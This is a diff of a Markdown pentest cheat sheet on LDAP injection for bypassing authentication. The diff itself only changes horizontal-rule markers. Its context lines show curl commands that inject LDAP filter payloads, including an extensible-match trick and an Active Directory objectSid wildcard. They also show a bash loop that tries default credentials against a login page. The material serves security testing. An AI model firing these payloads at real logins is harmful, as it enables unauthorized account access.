@@ -17,7 +17,7 @@ linked:
 ---
 # LDAP Injection - Auth Bypass
 
-***
+---
 
 ## Sub-Filter Injection en Login
 
@@ -50,7 +50,7 @@ password = anything
 # → first match = admin → login as admin
 ```
 
-___
+---
 
 ## Empty / NULL Bind
 
@@ -65,7 +65,7 @@ ___
 | `for user in admin manager root administrator; do for pass in '' admin password secret manager; do curl -s -d "username=$user&password=$pass" https://target/login \| grep -i success; done; done` | Bulk default creds | No conocés creds. |
 ^ldap-bypass-emptybind
 
-___
+---
 
 ## Filter Manipulation Variants
 
@@ -80,7 +80,7 @@ ___
 | `curl --data-urlencode "username=(uid:dn:caseIgnoreMatch:=admin)&password=any" https://target/login` | Extensible match injection | OpenLDAP extensible match feature. |
 ^ldap-bypass-filter-types
 
-___
+---
 
 ## Active Directory-Specific Bypass
 
@@ -96,4 +96,4 @@ ___
 | `curl -d "username=*)(objectSid=S-1-5-21-*&password=any" https://target/login` | SID-based filter inject | AD SID enumeration. |
 ^ldap-bypass-ad
 
-***
+---
